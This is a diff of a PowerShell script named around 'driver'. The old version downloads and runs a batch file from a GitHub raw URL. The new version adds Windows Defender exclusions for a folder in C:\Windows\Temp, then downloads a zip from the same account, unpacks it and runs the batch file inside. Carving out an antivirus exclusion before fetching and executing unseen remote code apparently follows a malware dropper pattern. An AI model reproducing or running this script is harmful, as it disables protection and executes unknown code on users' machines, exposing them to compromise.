@@ -1,19 +1,21 @@
-# Enable TLSv1.2 for compatibility with older clients
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Clear-DnsClientCache
-$DownloadURL = 'https://raw.githubusercontent.com/hinzdc/get/main/cmd/driver.bat'
 
-$FilePath = "$env:TEMP\driver.bat"
 
-try {
-    Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath
-} catch {
-    Write-Error $_
-	Return
-}
+Add-MpPreference -ExclusionPath $outputZip
+Add-MpPreference -ExclusionPath "C:\Windows\Temp\driver"
+Add-MpPreference -ExclusionPath "C:\Windows\Temp\driver.zip"
+$url = "https://github.com/hinzdc/get/raw/refs/heads/main/dl/driver.zip"
+$outputZip = "C:\Windows\Temp\driver.zip"
+$outputFolder = "C:\Windows\Temp\driver"
 
-if (Test-Path $FilePath) {
-    Start-Process $FilePath
-    exit
+Invoke-WebRequest -Uri $url -OutFile $outputZip
+
+Expand-Archive -Path $outputZip -DestinationPath $outputFolder
+
+$batFile = Join-Path -Path $outputFolder -ChildPath "driver\driver.bat"
+
+if (Test-Path $batFile) {
+    # Jalankan file Script_Run.bat
+    Start-Process -FilePath $batFile
+} else {
+    Write-Host "File Script_Run.bat tidak ditemukan."
 }
